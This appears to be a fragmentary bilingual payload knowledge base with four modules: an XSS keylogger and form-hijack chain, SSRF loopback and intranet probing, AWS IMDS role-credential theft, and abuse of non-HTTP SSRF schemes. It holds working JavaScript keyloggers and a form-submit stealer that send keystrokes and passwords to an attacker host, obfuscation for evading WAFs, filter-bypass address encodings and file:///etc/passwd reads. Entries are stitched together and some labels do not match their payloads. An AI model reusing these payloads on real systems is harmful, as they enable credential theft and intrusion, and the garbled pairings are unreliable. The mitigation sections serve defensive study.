prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 XSS 输入事件收集链的验证：基础 keypress 监听、缓冲整行外发、密码字段 change 窃取与表单提交劫持四种形态。用于确认注入脚本能否持续捕获用户击键与凭据输入。
overview.en: Covers verification of the XSS input-event collection chain across four forms: basic keypress listeners, buffered full-line exfiltration, password-field change theft, and form-submit hijacking. Used to confirm whether injected scripts can continuously capture keystrokes and credential input.

vulnerability.zh: 根因是注入脚本可注册页面级事件监听并访问表单字段值，keydown/change/submit 事件对脚本完全开放；脚本存活期间击键与表单数据持续外传，影响覆盖注入页面上的全部用户输入。
vulnerability.en: The root cause is injected scripts registering page-level event listeners and reading form field values: keydown/change/submit events are fully open to script. While the script lives, keystrokes and form data keep flowing out, covering every user input on the injected page.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步注入 keypress 监听外发击键，收集端按 key 参数收到按键流即确认基础记录链；第 2 步缓冲击键并在 Enter 时整段外发验证完整记录；第 3 步监听密码字段 change 外发字段值；第 4 步劫持 form submit 外发完整表单数据。收集端指向 {ATTACKER_HOST} 自有服务器；被 WAF 拦截时改用混淆版本。
exploitation.en: Use in Payload list order: step 1 injects a keypress listener exfiltrating keystrokes; the collector receiving the keystroke stream via the key parameter confirms the basic chain. Step 2 buffers keystrokes and sends the full line on Enter; step 3 listens on password-field change events to exfiltrate field values; step 4 hijacks form submit to exfiltrate the complete form data. Point the collector at your own {ATTACKER_HOST} server; when blocked by a WAF, switch to the obfuscated version.

mitigation.zh: 修复 XSS 注入点并以 CSP 限制内联脚本，凭据表单避免进入可注入渲染路径；修复后重放监听脚本应无法注册事件或无法外传，并在监控中对异常事件监听注册告警。
mitigation.en: Fix XSS injection points and restrict inline scripts via CSP, keeping credential forms out of injectable render paths; after the fix, replayed listeners must fail to register or exfiltrate, with monitoring alerting on abnormal event-listener registration.

description.zh: 注入按键监听把受害者每次输入立即发往控制端，日志按时间顺序拼接即可还原完整输入内容，先证明捕获通道可用。
description.en: Hook keypress and ship each key instantly; ordered log lines rebuild the typed content and prove the capture channel.

title.en: Buffer and flush input in batches

description.zh: 改为累积缓冲模式，遇回车键才整段外带，请求量骤减更加隐蔽，控制端一次即可拿到受害者的完整输入串内容。
description.en: Buffer keys and flush on Enter to cut request volume and stay quiet while delivering whole input strings at once.

attackChain.payload:
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://{ATTACKER_HOST}/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>

description.zh: 选中密码类输入框并监听值变化事件，受害者填写的口令被直接外带回收，捕获目标从普通输入内容升级到登录凭据材料。
description.en: Target input[type=password] change events to exfiltrate filled credentials, focusing capture from typing to secrets.

description.zh: 监听表单提交事件以 FormData 打包全部字段一次性外带，登录、改密等整表内容连同操作动作全部落网收割。
description.en: Hook form submit and serialize all fields via FormData so complete login or password-change payloads are captured in one shot.

attackChain.payload:
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://{ATTACKER_HOST}/log?" + new URLSearchParams(data).toString();
  });
});
</script>

title.en: Use the obfuscated build to evade detection

description.zh: 检测规则命中监听函数等特征时改用十六进制混淆脚本，函数名与字符串全部编码，监听逻辑保持不变继续收键。
description.en: When signatures like addEventListener trip rules, run the hex-obfuscated script with encoded names but identical listener logic.

analysis.zh: XSS 输入事件访问边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Input-Event Access Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 仅用合成键盘事件确认注入脚本能否注册页面事件，不收集、缓存或传输真实用户输入。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.zh: 注入 keypress 监听外发击键；收集端按 key 参数收到按键流即确认基础记录链可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Inject a keypress listener forwarding keystrokes; the keystroke stream arriving under the key parameter confirms the basic logger chain. {ATTACKER_HOST} renders to your collection server.

execution.command:
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://{ATTACKER_HOST}/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>

description.zh: 缓冲击键并在 Enter 时整段外发；收集端按 data 参数收到整行输入即确认缓冲记录可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Buffer keystrokes and send the whole line on Enter; the full line arriving under the data parameter confirms buffered logging. {ATTACKER_HOST} renders to your collection server.

explanation.zh: 按下回车时外带缓存的按键数据

description.zh: 监听密码字段 change 事件外发字段值；收集端按 pwd 参数收到密码值即确认表单窃取可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Listen for change events on password fields and exfiltrate values; the password arriving under the pwd parameter confirms form theft. {ATTACKER_HOST} renders to your collection server.

execution.command:
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://{ATTACKER_HOST}/log?" + new URLSearchParams(data).toString();
  });
});
</script>

description.zh: 劫持 form submit 外发完整表单数据；收集端收到表单字段集即确认提交劫持可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Hijack form submit events and exfiltrate the FormData; the form field set arriving at the collector confirms submit hijacking. {ATTACKER_HOST} renders to your collection server.

explanation.en: Enumerate all forms on the page

explanation.zh: 收集当前表单的全部字段值
序列化为查询字符串外带
explanation.en: Serialize and exfiltrate as query string

description.zh: 以十六进制混淆监听 keydown 外发按键；收集端仍收到按键即确认混淆版本可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Listen for keydown via hex-obfuscated identifiers and exfiltrate keys; keystrokes still arriving confirm the obfuscated variant works. {ATTACKER_HOST} renders to your collection server.

explanation.zh: 数组取值+方括号调用隐藏真实API
按键值经图片请求外带

name.zh: SSRF 最终连接目标验证

description.zh: 覆盖 SSRF 的最终连接目标验证：从回环地址与本机端口探测，到内网段主机与管理台触达，再到 file:// 本地文件读取，用于确认服务端请求的真实落点与内网暴露面。
description.en: Covers final-destination validation for SSRF: from loopback address and local port probing through intranet host and admin-console reachability to file:// local file reads, to confirm where server-side requests truly land and what the intranet exposure is.

prerequisites.zh: 确认 SSRF 最终连接目标验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Final-Destination Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF 最终连接目标验证覆盖服务端取回器的最终落点探测场景：针对可注入 URL 的取回功能，确认请求真实连接的 IP、端口与协议。验证维度涵盖回环地址、本机常用端口、内网段与管理台触达，以及 file:// 本地文件读取四类技术变体。
overview.en: SSRF Final-Destination Validation covers the server-side fetcher landing-point scenario: given a URL-injectable fetch function, determine the IP, port, and protocol the request actually connects to. Verification dimensions cover loopback addresses, common local ports, internal subnets and admin consoles, plus file:// local file read as four technical variants.

vulnerability.zh: 根因是服务端取回功能允许用户输入控制最终连接目标，而校验只检查原始 URL 字符串，未在规范化解析、DNS 解析和重定向后对最终 IP、端口与 scheme 重新分类，回环、私网与本地文件因此越过出站信任边界。
vulnerability.en: The root cause is that the server-side fetch function lets user input control the final connection target, while validation only inspects the raw URL string and never re-classifies the final IP, port, and scheme after canonical parsing, DNS resolution, and redirects; loopback, private networks, and local files therefore cross the egress trust boundary.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步的回环 URL 提交到注入点，响应内容、状态码或耗时与基线不同即确认可达本机服务；再用第 2 步逐端口区分监听服务；第 3 步探测内网管理台，返回登录页即确认内网面板可触达；第 4 步用 file:// 读本地文件验证 scheme 未被过滤。命中 WAF 拦截时查看 wafBypass 替换变体；命令中的占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: first submit the loopback URLs from step 1 to the injection point; a response body, status code, or timing different from the baseline confirms reachability of local services. Then use step 2 to differentiate listening services port by port; step 3 probes internal admin consoles — a returned login page confirms the panel is reachable; step 4 uses file:// to read local files and prove the scheme is not filtered. On WAF blocks, consult wafBypass for replacement variants; replace placeholders in the commands via the global variables menu.

mitigation.zh: 只允许业务必需的 http/https 协议与端口，解析后阻断回环、链路本地、私网和保留地址，连接时固定 IP 并在每次重定向后复检；禁止用户控制敏感请求头，并经网络策略隔离元数据、数据库与管理网段。修复后用第 1、4 步样例回归，合法功能保留且回环与 file 读取被拒绝。
mitigation.en: Allow only business-required http/https schemes and ports, block loopback, link-local, private, and reserved addresses after resolution, pin the connected IP, and re-check after every redirect; forbid user control of sensitive headers and isolate metadata, database, and management segments via network policy. After the fix, regress with the step 1 and step 4 samples: legitimate features remain and loopback and file reads are denied.

title.zh: 探测回环服务锁定出站可控
title.en: Probe loopback services to confirm outbound control

description.zh: 把 http://127.0.0.1/、http://localhost/ 等回环地址逐一提交到注入点并比对响应；任一地址返回有效内容或非超时状态，即证明服务端出站请求受输入控制。
description.en: Submit loopback URLs such as http://127.0.0.1/ and http://localhost/ to the injection point and compare responses; any valid content or non-timeout response proves the server's outbound request is attacker-controlled.

title.zh: 变形地址绕过回环过滤
title.en: Bypass loopback filters with address variants

description.zh: 若明文回环地址被拦截，改用 0177.0.0.1、2130706433、0x7f000001 等进制变形重放；任一变形返回与第 1 步相同内容，即表明过滤仅做字面匹配可被绕过。
description.en: If plain loopback addresses are blocked, replay with radix variants like 0177.0.0.1, 2130706433 and 0x7f000001; any variant returning the same content as step 1 shows the filter matches literals only and can be bypassed.

title.zh: 扫描内网端口与管理面板
title.en: Scan intranet ports and admin panels

description.zh: 提交网关端口载荷探测 192.168.1.1 的 22/80/443/3306，再请求 /admin、:8080/manager 等管理台地址；命中登录页或特征接口即锁定可触达的内网资源。
description.en: Probe 22/80/443/3306 on the gateway with the port payloads, then request admin paths like /admin and :8080/manager; a login page or characteristic API response marks reachable intranet assets.

description.zh: 向注入点提交 file:///etc/passwd、file:///c:/windows/win.ini 等 URI；回显账户列表或配置段落即证明 file 协议可用，可继续拖取密钥与配置文件。
description.en: Submit file URIs such as file:///etc/passwd and file:///c:/windows/win.ini; echoed account lists or config sections prove the file scheme works, opening the way to key and config exfiltration.

analysis.zh: SSRF 最终连接目标验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF Final-Destination Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 确认服务端取回器是否允许用户输入改变解析地址、最终连接 IP、端口或重定向目标。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

title.zh: 回环地址探测本机服务

description.zh: 逐条将回环 URL 提交到 SSRF 注入点并对比响应；任一地址返回与基线不同的内容、状态码或耗时，即确认 SSRF 可达本机服务。
description.en: Submit each loopback URL to the SSRF injection point and compare responses; any address returning content, status, or timing different from the baseline confirms SSRF reaches local services.

title.zh: 网关常用端口连通探测

description.zh: 逐条探测内网网关 192.168.1.1 的常用端口并记录响应差异；某端口返回非超时响应（banner 或状态差异）即确认对应服务在目标侧内网监听。
description.en: Probe common loopback ports one by one and record response differences; a non-timeout response (banner or status change) confirms the corresponding service listens on the target side.

description.zh: 逐条探测内网管理台地址并对比响应；返回管理台登录页或特征内容即确认可触达对应内网面板。
description.en: Probe internal admin-console addresses one by one; a returned login page or signature content confirms the corresponding internal panel is reachable.

title.zh: file 协议读取本地文件

description.zh: 逐条提交 file URI 并观察响应差异；返回 passwd、win.ini 或 environ 内容即确认 file scheme 未被过滤且可读本地文件。
description.en: Submit each file URI and observe response differences; returned passwd, win.ini, or environ content confirms the file scheme is unfiltered and local files are readable.

title.zh: SSRF 最终连接目标验证清理后命令 1

description.zh: 逐条提交整数、八进制、十六进制与通配 DNS 回环变体并对比拦截情况；过滤拦截 127.0.0.1 而某变体仍返回回环内容，即确认地址规范化缺口。
description.en: Submit integer, octal, hex, and wildcard-DNS loopback variants and compare filtering; a variant returning loopback content while 127.0.0.1 is blocked confirms an address-canonicalization gap.

title.zh: URL 解析歧义绕过过滤

description.zh: 逐条提交解析器差异 URL 并对比请求落点；带外域名收到回连或返回解析歧义内容，即确认 URL 解析差异可绕过过滤。
description.en: Submit parser-differential URLs and compare where requests land; an out-of-band hit or differential content confirms URL parsing ambiguity bypasses the filter.

title.zh: SSRF 最终连接目标验证清理后命令 3

description.zh: 逐条提交通配 DNS 域名并观察解析与响应；域名解析到 127.0.0.1 且返回回环内容，即确认主机名白名单可被通配 DNS 绕过。
description.en: Submit wildcard-DNS names and observe resolution and responses; a name resolving to 127.0.0.1 with returned content confirms the hostname allowlist can be bypassed via wildcard DNS.

explanation.zh: sslip.io 与 nip.io 将内嵌 IP 恒定解析回该 IP（此处 127.0.0.1），用于绕过基于字符串黑名单的内网地址检查；两者不做交替解析，并非 DNS 重绑定服务（真实重绑定行为见 cmdi2-rbndr-us）
explanation.en: sslip.io and nip.io constantly resolve the embedded IP (here 127.0.0.1), bypassing string-blacklist checks for internal addresses; they never alternate and are not DNS rebinding services (see cmdi2-rbndr-us for real rebinding behavior)

description.zh: 绕过对 127.0.0.1 十进制字面量的黑名单：八进制表示解析后等价；内部端口响应差异出现即成功。
description.en: Represent the loopback octally to defeat decimal blacklists; a differing response from the internal port confirms success.

description.zh: 绕过对 IPv4 与 IPv6 分开的规则：用映射地址跨界；连接内网服务成功即成功。
description.en: Cross the v4/v4-mapped boundary against separated rule sets; a successful connection to the internal service confirms success.

description.zh: 绕过完整四段地址匹配：缩写形式展开后仍为回环；端口指纹可辨即成功。
description.en: Use abbreviated forms that expand to the loopback past full four-octet matching; a recognizable port fingerprint confirms success.

title.zh: 回环与本机常用端口扫描
title.en: Validation step 1 for Loopback Service-Port SSRF Probes

description.zh: 逐条请求回环端口并记录响应与日志差异；成功时开放端口返回非超时响应，据此区分服务存活与关闭。
description.en: Request each loopback port and record response and log differences; open ports returning non-timeout responses distinguishes live services from closed ones.

description.zh: 绕过对点分十进制私网段规则：192.168.0.1 与 10.0.0.1 转为 32 位整数；内网网关页面返回即成功。
description.en: Convert private ranges to 32-bit integers past dotted-decimal rules; an internal gateway page returning confirms success.

description.zh: 绕过对十进制私网黑名单：十六进制表示同一目标；服务响应差异出现即成功。
description.en: Represent the same targets hexadecimally against decimal blacklists; a differing service response confirms success.

description.zh: 绕过按地址族分别过滤的规则：以映射形式访问私网；内网服务可达即成功。
description.en: Access private ranges in mapped form against per-family filtering; the internal service being reachable confirms success.

title.en: Validation step 1 for Private-Gateway and Service-Port SSRF Probes

description.zh: 逐条请求私网网关与服务端口并记录响应与日志差异；成功时存活主机或端口返回非超时响应，形成内网可达性地图。
description.en: Request each private gateway and service port and record response and log differences; live hosts or ports returning non-timeout responses builds the intranet reachability map.

title.zh: WAF 绕过：IP十进制/八进制/十六进制绕过
title.en: Validation step 1 for Non-Canonical Loopback IP SSRF

description.zh: 逐条提交非规范回环表示并记录响应与日志差异；成功时某变体解析为 127.0.0.1 且被取回，而标准形式被过滤，即确认解析差异。
description.en: Submit each non-canonical loopback representation and record response and log differences; a variant resolving to 127.0.0.1 and fetched while the canonical form is blocked confirms the parsing difference.

description.zh: 在隔离环境给每行补上同一固定测试端口并逐条请求；公共 DNS 名称应先替换为自有记录，禁止扫描其他本地端口。
description.en: Append the same fixed test port to each line in isolation and request them individually; replace public DNS names with controlled records first and never scan other local ports.

name.zh: AWS IMDS 元数据窃取 SSRF 验证

description.zh: 覆盖 AWS 元数据服务的 SSRF 验证：从 IMDS 元数据与角色临时凭证读取，到 user-data 启动脚本获取，再到携带 token 的 IMDSv2 流程复现，用于确认云实例凭证与自定义数据是否可被窃取。
description.en: Covers SSRF validation against the AWS metadata service: from IMDS metadata and role temporary-credential reads through user-data startup script retrieval to token-carrying IMDSv2 flow replay, to confirm whether cloud instance credentials and custom data can be stolen.

prerequisites.zh: 确认 AWS IMDSv2 SSRF 验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for AWS IMDSv2 SSRF Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: AWS IMDSv2 SSRF 验证覆盖云实例元数据窃取场景：针对部署在 EC2 上的服务端取回功能，验证注入点能否访问 169.254.169.254。验证维度涵盖 IMDS 元数据目录读取、角色临时凭证获取、user-data 启动脚本读取与携带 token 的 IMDSv2 流程复现。
overview.en: AWS IMDSv2 SSRF Validation covers cloud instance metadata theft: for a server-side fetch function deployed on EC2, verify whether the injection point can reach 169.254.169.254. Verification dimensions cover IMDS metadata directory reads, role temporary credential retrieval, user-data startup script reads, and replaying the token-bearing IMDSv2 flow.

vulnerability.zh: 根因是服务端可发起出站请求且网络层允许到达链路本地的 IMDS，攻击者借此读取实例身份、附加角色的临时 AccessKeyId/SecretAccessKey，以及 user-data 中可能残留的密钥；IMDSv2 的 PUT token 流程同样可被 SSRF 逐步复现。
vulnerability.en: The root cause is that the server can issue outbound requests and the network layer permits reaching the link-local IMDS, letting an attacker read the instance identity, the attached role's temporary AccessKeyId/SecretAccessKey, and any secrets left in user-data; the IMDSv2 PUT token flow can likewise be replayed step by step via SSRF.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步访问元数据根路径，返回 instance-id 等目录字段即确认 IMDS 可达；第 2 步先枚举已附加角色名，再读取该角色的临时凭证 JSON，拿到 AccessKeyId 即确认凭证可窃取；第 3 步读取 user-data 检查是否残留密钥；第 4 步先 PUT 获取带 TTL 的 token，再携带 X-aws-ec2-metadata-token 头复现 v2 流程。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 accesses the metadata root path — returned directory fields such as instance-id confirm IMDS reachability; step 2 enumerates the attached role name, then reads that role's temporary credential JSON — obtaining an AccessKeyId confirms credential theft; step 3 reads user-data to check for leftover secrets; step 4 first PUTs for a TTL token, then replays the v2 flow with the X-aws-ec2-metadata-token header. Replace placeholders via the global variables menu.

mitigation.zh: 将实例元数据强制为 IMDSv2 并把 token hop limit 设为 1，阻断工作负载到链路本地的非必要出站；附加角色只授予最小权限并定期轮换。修复后用第 1、2 步样例回归，元数据请求应在网络层被拒绝或无法取得角色凭证。
mitigation.en: Enforce IMDSv2 for instance metadata with a token hop limit of 1, and block unnecessary egress from workloads to the link-local address; grant attached roles least privilege and rotate them. After the fix, regress with the step 1 and step 2 samples: metadata requests should be denied at the network layer or yield no role credentials.

description.zh: 提交 http://169.254.169.254/latest/meta-data/ 到注入点；返回 ami-id、hostname 等元数据目录即确认元数据服务可达，SSRF 已能触达云层。
description.en: Submit http://169.254.169.254/latest/meta-data/; a directory listing with ami-id and hostname confirms the metadata service is reachable and the SSRF extends into the cloud layer.

title.zh: 变形地址绕过元数据过滤
title.en: Bypass metadata filtering with address variants

description.zh: 若链路本地地址被拦截，改用 2852039166、0xA9FEA9FE、[::ffff:169.254.169.254] 等变形重访；任一写法返回元数据目录即绕过基于字面 IP 的过滤规则。
description.en: If link-local addresses are blocked, revisit with variants like 2852039166, 0xA9FEA9FE and [::ffff:169.254.169.254]; any variant returning the metadata directory defeats the literal-IP filter.

title.zh: 窃取 IAM 角色临时凭证

description.zh: 沿 /iam/security-credentials/ 路径先列出角色名再请求具体角色；响应出现 AccessKeyId、SecretAccessKey、Token 字段即拿到实例角色的临时凭证。
description.en: Walk /iam/security-credentials/ to list roles, then request the role path; AccessKeyId, SecretAccessKey and Token fields in the response yield the instance role's temporary credentials.

title.zh: 攻破 IMDSv2 令牌防护

description.zh: 对启用 IMDSv2 的实例先用 PUT /latest/api/token 并携带 TTL 头换取 token，再带 token 重访元数据接口；返回元数据内容即 v2 强制校验被绕过。
description.en: For IMDSv2 instances, PUT /latest/api/token with the TTL header to mint a token, then revisit metadata with it; metadata content in the response means the v2 enforcement is defeated.

title.zh: 拖取 user-data 启动脚本

description.zh: 请求 /latest/user-data/ 读取实例初始化脚本；返回内容中的数据库口令、API 密钥即成为进入内网与云下资源的第二把钥匙。
description.en: Request /latest/user-data/ to read the bootstrap script; database passwords and API keys inside become the second key into the intranet and downstream resources.

analysis.zh: AWS IMDSv2 SSRF 验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: AWS IMDSv2 SSRF Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 在自有 EC2 实验实例中验证取回器是否能执行 IMDSv2 令牌流程，并只读取低敏感度实例字段。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.zh: 逐条经 SSRF 注入点访问 AWS IMDS 路径；返回元数据目录或字段（如 instance-id）即确认 IMDS 可达。
description.en: Access AWS IMDS paths through the SSRF injection point; a returned metadata directory or fields (such as instance-id) confirm IMDS reachability.

title.en: AWS IMDSv2 SSRF Validation Cleaned Command 2

description.zh: 枚举已附加角色名后读取指定角色的临时凭证；返回含 AccessKeyId 与 SecretAccessKey 的 JSON 即确认角色凭证可被窃取。
description.en: Enumerate attached role names and read temporary credentials for the chosen role; JSON containing AccessKeyId and SecretAccessKey confirms role credentials can be stolen.

title.zh: 读取 user-data 启动脚本
title.en: AWS IMDSv2 SSRF Validation Cleaned Command 3

description.zh: 读取 user-data 启动脚本；返回明文启动脚本即确认实例自定义数据可被读取，注意其中可能包含密钥。
description.en: Read user-data startup scripts; plaintext returned confirms instance custom data is readable and may contain secrets.

syntaxBreakdown.part: 可能包含敏感信息、API密钥、启动脚本

title.zh: PUT 取 token 读元数据
title.en: AWS IMDSv2 SSRF Validation Cleaned Command 4

execution.command:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

GET http://169.254.169.254/latest/meta-data/
Header: X-aws-ec2-metadata-token: {IMDSV2_TOKEN}

description.zh: 先 PUT 获取 IMDSv2 token，再携带 token 请求头读取元数据；第一步取得带 TTL 的 token 且第二步返回元数据，即确认 v2 流程可被 SSRF 复现。
description.en: PUT to obtain an IMDSv2 token, then read metadata with the token header; obtaining a TTL-bearing token and then metadata confirms the v2 flow can be replayed through SSRF.

title.zh: IMDS 地址进制变形绕过
title.en: AWS IMDSv2 SSRF Validation Cleaned Command 1

description.zh: 逐条提交 IMDS 地址的整数、十六进制与 IPv6 映射变体；任一变体返回元数据而标准地址被拦截，即确认过滤只匹配字符串形式。
description.en: Submit integer, hex, and IPv6-mapped IMDS address variants; any variant returning metadata while the literal form is blocked confirms string-only filtering.

title.zh: 重定向与重绑定链式绕过
title.en: AWS IMDSv2 SSRF Validation Cleaned Command 2

description.zh: 提交开放重定向、rbndr.us 重绑定与 gopher 变体；重定向主机收到跳转请求或重绑定解析后返回元数据，即确认链式绕过成立。
description.en: Submit open-redirect, rbndr.us rebinding, and gopher variants; a redirect hit on the attacker host or metadata returned after rebinding confirms a chained bypass.

name.zh: SSRF 非 HTTP Scheme 协议探测

description.zh: 覆盖 SSRF 非 HTTP Scheme 边界验证：从 file:// 读取与 dict:// 端口探测，到 gopher:// 任意 TCP 报文构造，再到 ldap:// 与 tftp:// 出网确认，厘清各 Scheme 可达范围。
description.en: Covers non-HTTP scheme boundary validation for SSRF: from file:// reads and dict:// port probing through gopher:// arbitrary TCP frame construction to ldap:// and tftp:// egress confirmation, clarifying the reachable range of each scheme.

prerequisites.zh: 确认 SSRF 非 HTTP Scheme 协议探测的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Non-HTTP Scheme Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF 非 HTTP Scheme 边界验证覆盖取回器协议面滥用场景：针对允许自定义 scheme 的 URL 注入点，逐一验证 file、dict、gopher、ldap 与 tftp 是否越过业务允许范围。验证维度从本地文件读取、端口命令交互，到任意 TCP 报文构造与出网确认。
overview.en: SSRF Non-HTTP Scheme Boundary Validation covers fetcher protocol-surface abuse: for URL injection points accepting custom schemes, verify one by one whether file, dict, gopher, ldap, and tftp exceed the business-allowed scope. Verification dimensions range from local file reads and port command interaction to arbitrary TCP packet construction and egress confirmation.

vulnerability.zh: 根因是应用未建立 scheme 允许列表时通用 URL 库自动启用非 HTTP 处理器：gopher 把百分号解码后的受控字节直接写入 TCP 套接字，dict 向内网协议端口发送命令行，file 则绕过网络边界交给本地文件系统读取。
vulnerability.en: The root cause is that without a scheme allowlist, general-purpose URL libraries automatically enable non-HTTP handlers: gopher writes percent-decoded attacker-controlled bytes straight to a TCP socket, dict sends command lines to internal protocol ports, and file bypasses the network boundary entirely by handing the path to the local filesystem.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交 file:// 读 /etc/passwd 等文件，返回内容即确认 scheme 未被过滤；第 2 步用 dict:// 探测回环 Redis 与 Memcached，收到 INFO 或 stats 回显即确认可交互；第 3 步用 gopher 向隔离监听器发送 RESP 帧验证任意 TCP 字节转发；第 4、5 步把 ldap:// 与 tftp:// 指向回连主机确认出网能力。命中拦截时查看 wafBypass；占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 submits file:// for /etc/passwd and similar files — returned content confirms the scheme is unfiltered; step 2 probes loopback Redis and Memcached with dict:// — an INFO or stats reply confirms interactive access; step 3 sends a RESP frame to an isolated listener with gopher:// to prove arbitrary TCP byte forwarding; steps 4 and 5 point ldap:// and tftp:// at your callback host to confirm egress. On blocks, consult wafBypass; replace placeholders via the global variables menu.

mitigation.zh: URL 获取器只允许业务必需的 http/https，显式拒绝 file、gopher、dict 等协议；解析后阻断回环、私网与链路本地地址，网络层限制到数据库与内网服务端口的访问。修复后用第 1、2 步样例回归，全部非 HTTP scheme 都应被直接拒绝。
mitigation.en: Allow only business-required http/https in the URL fetcher and explicitly reject file, gopher, dict, and similar schemes; block loopback, private, and link-local addresses after resolution, and restrict database and internal service ports at the network layer. After the fix, regress with the step 1 and step 2 samples: every non-HTTP scheme should be denied outright.

title.zh: 读取本地文件验证 file 协议
title.en: Verify the file scheme on local files

description.zh: 向注入点提交 file:///etc/passwd；响应回显账户文件内容即确认 file 协议可用，攻击面从 HTTP 扩展到本地文件读取。
description.en: Submit file:///etc/passwd to the injection point; echoed file content confirms the file scheme works, extending the attack surface from HTTP to local file reads.

title.zh: 大小写变形绕过协议过滤
title.en: Bypass scheme filters with case variants

description.zh: 若 file:// 被拦截，改用 FILE:///、File:/// 等大小写混合形式重放；仍能读出文件内容即表明过滤未对协议名做归一化处理。
description.en: If file:// is blocked, replay with mixed-case forms like FILE:/// and File:///; file content still returned shows scheme names are not normalized before filtering.

title.zh: dict 协议探测内网服务

description.zh: 提交 dict://127.0.0.1:6379/info 与 dict://127.0.0.1:11211/stats；回显版本与统计信息即分别确认 Redis、Memcached 未授权可达。
description.en: Submit dict://127.0.0.1:6379/info and dict://127.0.0.1:11211/stats; version and stats output confirm unauthenticated Redis and Memcached respectively.

title.zh: gopher 伪造 TCP 报文攻击内网
title.en: Craft raw TCP attacks with gopher

